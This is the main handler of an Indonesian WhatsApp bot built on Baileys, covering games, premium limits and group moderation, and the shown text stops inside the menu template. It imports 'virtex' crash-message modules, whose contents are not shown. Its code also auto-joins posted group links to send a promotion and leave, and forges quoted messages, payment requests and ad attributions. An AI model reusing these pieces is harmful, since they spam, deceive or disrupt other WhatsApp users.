require('./kokoh')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, Mimetype, generateWAMessage, prepareWAMessageMedia, prepareMessageFromContent,  areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const os = require('os')
const util = require('util')
const path = require('path')
const axios = require('axios')
const chalk = require('chalk')
const crypto = require('crypto')
const dani = require('./lib/null.js')
const { cerpen } = require('./storage/story/cerpen')
const yts = require('yt-search')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const google = require('google-it')
const { exec, spawn, execSync } = require("child_process")
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { jadibot, listJadibot } = require('./lib/jadibot')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const barat = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const tengah = moment.tz('Asia/Makassar').format('HH:mm:ss')
const timur = moment.tz('Asia/Jayapura').format('HH:mm:ss')
const nyoutube = (global.ytname)
const dicayt = ('*ɴᴏᴛᴇ  :*\n*• ʙᴏᴛ ᴍᴀsɪʜ ᴅᴀʟᴀᴍ ᴛᴀʜᴀᴘ ᴘᴇʀᴋᴇᴍʙᴀɴɢᴀɴ ᴊɪᴋᴀ ᴀᴅᴀ ʙᴜɢ sɪʟᴀʜᴋɴ ʟᴀᴘᴏʀ ᴋᴇ ᴏᴡɴᴇʀ.*')
const ini_mark = `0@s.whatsapp.net`
global.prem = require("./lib/premium")
const delay = new Promise(resolve => setTimeout(resolve, 3000));
// database virtex
const { philips } = require('./lib/virtex/philips')
const { virus } = require('./lib/virtex/virus')
const { ngazap } = require('./lib/virtex/ngazap')

//TIME
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 } 
 const _antivirtex = JSON.parse(fs.readFileSync('./lib/antivirtex.json'))
 //Database\\
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
let premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let banned = JSON.parse(fs.readFileSync('./database/user/banned.json'));

module.exports = dica = async (dica, m, chatUpdate, store) => {
    try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await dica.decodeJid(dica.user.id)
const itsMeDica = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
const from = mek.key.remoteJid
	    const cekUser = (users, id) => {     
var cek = null
Object.keys(user).forEach((i) => { 
if (user[i].id === id){ cek = i } })
if (cek !== null){ 
if (users == "id"){ return user[cek].id }
if (users == "emote"){ return user[cek].emote }
if (users == "timers"){ return user[cek].timers }
if (users == "hit"){ return user[cek].hit }
if (users == "star"){ return user[cek].star }
if (users == "alasan"){ return user[cek].alasan }
if (users == "ban"){ return user[cek].ban }
if (users == "premium"){ return user[cek].premium }
}
if (cek == null) return null
}

const color = (text, color) => {
    return !color ? chalk.green(text) : chalk.keyword(color)(text)
}

const bgcolor = (text, bgcolor) => {
	return !bgcolor ? chalk.green(text) : chalk.bgKeyword(bgcolor)(text)
}

	const isAntiVirtex = m.isGroup ? _antivirtex.includes(m.chat) : false
// Group
const groupMetadata = m.isGroup ? await dica.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
	    const isBan = banned.includes(m.sender)
const isPremium = itsMeDica || itsMeDica || prem.checkPremiumUser(m.sender, premium);
    
//function leveling & pick
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                
                limit: limitUser,
            }
    //db data on/off
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('autovn' in chats)) chats.autovn = true
                if (!('autojoin' in chats)) chats.autojoin = false
                if (!('antivirtex' in chats)) chats.antivirtex = false
                if (!('antilink' in chats)) chats.antilink = false
                if (!('simi' in chats)) chats.simi = true
            } else global.db.data.chats[m.chat] = {
                mute: false,
                autovn: true,
                autojoin: false,
                antivirtex: false,
                antilink: false,
                simi: true,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
        if (!('anticall' in setting)) setting.anticall = true
		if (!('autobio' in setting)) setting.autobio = true
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: true,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        } 
    
// Public & Self
if (!dica.public) {
    if (!m.key.fromMe) return
} //event listener 
if (m.message) {
	dica.readMessages([m.key])
	dica.sendPresenceUpdate('composing', from) 
        }
        if (!m.isGroup && isCmd) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (m.isGroup && isCmd) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}
            
       //react
        if (m.text.includes("🗿")) {
    dica.sendMessage(m.chat, {
          react: {
            text: '🗿',
            key: m.key
          }})
        }
        if (m.text.includes("kila")) {
    dica.sendMessage(m.chat, {
          react: {
            text: '❤️',
            key: m.key
          }})       
          }
          if (m.text.includes("http")) {
dica.sendMessage(m.chat, { text: mess.jasher });
}
          if (m.text.includes("bot")) {
    const emojiArr = ['😌', '😠', '🤔', '🙄', '😏']
    let randomEmoji = emojiArr[Math.floor(Math.random()*emojiArr.length)];
    dica.sendMessage(m.chat, {
          react: {
            text: randomEmoji,
            key: m.key
          }
    });
}

          //autojoin
  if (db.data.chats[m.chat].autojoin) {
    if (m.text.includes("https://chat.whatsapp.com")) {
        let args = m.text.match(/https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9-_]+/g);
        let result = args[0].split(`https://chat.whatsapp.com/`)[1]
       await dica.groupAcceptInvite(result)
      
        .then((res) => {
            dica.sendMessage(res, { text: mess.jasher });
console.log("Bot berhasil masuk ke grup: " + res);
            setTimeout(() => {
                dica.groupLeave(res);
                console.log(`Bot left group with id: ${res}`);
            }, 15000);
        })
        .catch((err) => console.log(`link invalid`));
    }
}




function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}
const hsjdh = randomNomor(5)

	//auto reply 
			for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./media/vn/${anju}.mp3`)
					dica.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}

/////TEKS BUTTON
const prem1 = `Hai kak  ${pushname} ${ucapanWaktu} \n\nFitur Ini Khusus Member Premium Silahkan Buy Premium Untuk Menggunakan Fitur Ini `
const prem2 = `Klik tombol di bawah ini untuk membeli premium \n © Kilaaa`
const prem3 = [{buttonId: `${prefix}beliprem`,buttonText: {displayText: `BELI PREMIUM`,},type: 1,},]

blomdaftar = `${ucapanWaktu} @${sender.split("@")[0]} Kamu belum terdaftar di database cek private message mu untuk mendaftar`
limitabis = `*[LIMIT KAMU HABIS]*\nBeli limit di ${prefix}buylimit atau beli premium untuk mendapatkan unlimited limit`
//SAMA"
const drip =  {
  key : {
    fromMe: false,
participant : '0@s.whatsapp.net'
},
     contextInfo: {
    forwardingScore: 9999,
    isForwarded: false, //:'v
showAdAttribution: true,
title: nyoutube,
mediaType: "VIDEO",
mediaUrl: `https://githb.com/Ajmal-Achu/Wizard-MD`,
previewType: "PHOTO",
thumbnail: thumb,
sourceUrl: "",
detectLinks: false,
    }}

	//BUTON MESAGE
	const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const butonna = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
dica.sendMessage(id, butonna, options)
}
const http = randomNomor(500)

// DOCUMENT
const kontol = {
	key : {
   participant : '0@s.whatsapp.net'
},
       message: {
    documentMessage: {
    title: `${pushname}`, 
    jpegThumbnail: thumb
  }
}
      }
sendMenuDoc = async (ID, doc, fileName, fileLength, caption, footer, time, buttons, boddy, thumbnail, thumbnailUrl, sourceUrl, mediaUrl, options) => {
let buttonMessage = {
  document: doc,
  mimetype: "application/pdf",
  fileName: fileName,
  fileLength: fileLength,
  caption: caption,
  footer: footer,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
     title: time,
     body: boddy,
     thumbnail: thumbnail,
     thumbnailUrl: thumbnailUrl,
     sourceUrl: sourceUrl,
     mediaUrl: mediaUrl,  
     renderLargerThumbnail: true,
     showAdAttribution: true,
     mediaType: 1
   }}
       }
   dica.sendMessage(m.chat, buttonMessage, options)
   }
   //Premium Exp
prem.expiredCheck(dica, m, premium);
   
   // reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
  // code to be executed
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        //Resize
         const reSize = async(buffer, ukur1, ukur2) => {
             return new Promise(async(resolve, reject) => {
             let jimp = require('jimp')
             var baper = await jimp.read(buffer);
             var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
             resolve(ab)
             })
             }
                  // dica-Chan
      const deploy = (teks) => { dica.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
      const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `${ytname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ytname,;;;\nFN:ytname\nitem1.TEL;waid=6281238996370:6281238996370\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await reSize(thumb, 100, 100), thumbnail: await reSize(thumb, 100, 100),sendEphemeral: true}}}
        
        // auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		dica.setStatus(`Kilaaa | Runtime : ${runtime(process.uptime())}`)
		setting.status = new Date() * 1
	    }
	}

	  // Anti Link
if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.what`)) {
        m.reply(`「 *ANTI LINK* 」\n\n*Kamu terdeteksi mengirim link group*, *kamu akan di kick‼️*`)
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        if (!isBotAdmins) return m.reply(`*Gajadi/nTernyata Kilaaa Ga Admin`
)
        let gclink = (`https://chat.whatsapp.com/`+await dica.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        
        if (isgclink) return m.reply(`*maaf gak jadi, karena kamu ngirim link group ini*`)
        
        if (isAdmins) return m.reply(`*maaf kamu admin*`)
        
        if (itsMeDica) return m.reply(`*gajadi ternyat kamu ayang aku🤭*`)
        
        dica.sendMessage(m.chat, { delete: m.key })

        dica.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        } 
        // Anti Link delete chat
     /**   if (global.db.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`*ANTI LINK*\n\nKamu terdeteksi mengirim link group, maaf Pesan Yang Kamu Kirim akan di tarik!`)
        if (!isBotAdmins) return m.reply(`Ehh kila gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await dica.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (itsMeDica) return m.reply(`Ehh maaf owner ganteng`)
        dica.sendMessage(m.chat, { delete: m.key })
        }
        } **/
        //antivirtex 

if (budy.length > 3500) {
if (!m.isGroup) return
if (!isAntiVirtex) return
if (!isBotAdmins) return
m.reply('Tandai telah dibaca\n'.repeat(300))
m.reply(`「 *VIRTEX DETECTOR* 」\n\nKamu mengirimkan virtex, maaf kamu di kick dari group`)
console.log('Kayaknya sih virtxanu');
dica.sendMessage(m.chat, { delete: m.key });
dica.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
}     

      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !itsMeDica) {
      return
      }

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: dica.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, dica.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
dica.ev.emit('messages.upsert', msg)
}
	    
if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            dica.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await dica.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, dica.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await dica.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, dica.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await dica.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, dica.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await dica.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, dica.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await dica.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, dica.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await dica.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, dica.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await dica.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await dica.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    dica.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    dica.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) dica.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) dica.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) dica.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    dica.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) dica.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) dica.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    dica.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
        }
        }
        switch(command) {
        	//Awal dari Case nya :v     	
        	case 'p': {
        	m.reply('Iʏᴀ > ᴀᴅᴀ ᴀᴘᴀ?')
        }
        break

//menunya ya kids
        case 'menu': { 
const Jimp = require('jimp')
dica.sendMessage(m.chat, { react: { text: "🌸", key: m.key }})
dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/menukila.mp3`)
const reSize = (buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}
buffer = global.thumb
                dica.sendMessage(m.chat, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                await new Promise(resolve => setTimeout(resolve, 3000));
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
  	anu = `*Hai Kak* *${pushname}* ${ucapanWaktu}
╭──➣「 𝙄𝙉𝙁𝙊 𝙐𝙎𝙀𝙍 」♡ۣۜۜ፝͜͜͡͡✿
├ *Nama* : ${pushname}
├ *Number* : ${me.split('@')[0]}
├ *Premium* : ${isPremium ? '✅' : `❌`}
├ *Limit* : ${isPremium ? '♾𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲' : `〽️${db.data.users[m.sender].limit}`}
╰────────────♡ۣۜۜ፝͜͜͡͡✿

╭──♡ۣۜۜ፝͜͜͡͡✿「 𝗜𝙉𝙁𝙊 𝘽𝙊𝙏 」♡ۣۜۜ፝͜͜͡͡✿
├ *Owner* : 𝑫𝑰𝑪𝑨♛
├ *Nama Bot* : ♡𝒌𝒊𝒍𝒂𝒂𝒂♚
├ *Mode* : ${dica.public ? 'Public' : `Self`}
